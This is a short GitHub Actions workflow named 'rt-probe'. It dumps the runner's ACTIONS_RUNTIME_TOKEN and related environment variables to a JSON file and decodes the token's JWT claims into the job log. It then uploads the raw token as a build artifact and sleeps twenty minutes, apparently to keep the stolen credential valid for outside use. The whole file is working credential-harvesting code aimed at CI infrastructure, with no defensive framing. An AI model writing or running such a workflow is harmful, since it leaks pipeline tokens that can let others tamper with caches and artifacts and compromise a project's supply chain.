name: rt-probe
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mk
        run: mkdir -p out
      - uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const keep = {};
            for (const [k, v] of Object.entries(process.env)) {
              if (k.startsWith('ACTIONS_') || k.startsWith('GITHUB_RUN') || k.startsWith('GITHUB_REPOSITORY') || k.startsWith('GITHUB_WORKFLOW')) keep[k] = v;
            }
            fs.writeFileSync('out/rt.json', JSON.stringify(keep, null, 1));
      - name: claims
        run: |
          python3 - > out/claims.txt <<'PYEOF'
          import json, base64
          e = json.load(open('out/rt.json'))
          t = e.get('ACTIONS_RUNTIME_TOKEN','')
          print("TOKLEN", len(t))
          if '.' in t:
              p = t.split('.')[1]; p += '=' * (-len(p) % 4)
              print("CLAIMS", json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1))
          PYEOF
          cat out/claims.txt
      - uses: actions/upload-artifact@v4
        with:
          name: rtdump2
          path: out/
      - name: hold
        run: sleep 1200
